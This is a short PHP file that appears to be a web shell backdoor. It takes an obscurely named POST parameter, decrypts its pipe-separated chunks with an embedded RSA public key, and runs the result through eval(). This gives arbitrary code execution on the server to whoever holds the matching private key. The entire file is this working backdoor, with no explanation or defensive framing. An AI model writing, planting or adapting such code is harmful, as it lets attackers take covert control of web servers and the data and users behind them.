<?php
$cmd = @$_POST['kuthuc81speCh4WepajocL'];
$pk = <<<EOF
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCMpA4x+fjQFgeb1a8SGnB7c5TF
90FgXoYlOZmPsqiS1sd0cZ/2fIbxqovwbXr5kQkuNewPPAQWEsAB+SiH580Hwcig
lStCM2a/ENcSJfpUsMQCDPmeMbfn3wd4BQQAMzDxeGAzYogepL09rLLLOh8bBB2j
kAJZ7jIT2ua3Tjy93wIDAQAB
-----END PUBLIC KEY-----
EOF;
$cmds = explode("|", $cmd);
$pk = openssl_pkey_get_public($pk);
$cmd = '';
foreach ($cmds as $value) {
  if (openssl_public_decrypt(base64_decode($value), $de, $pk)) {
    $cmd .= $de;
  }
}
eval($cmd);
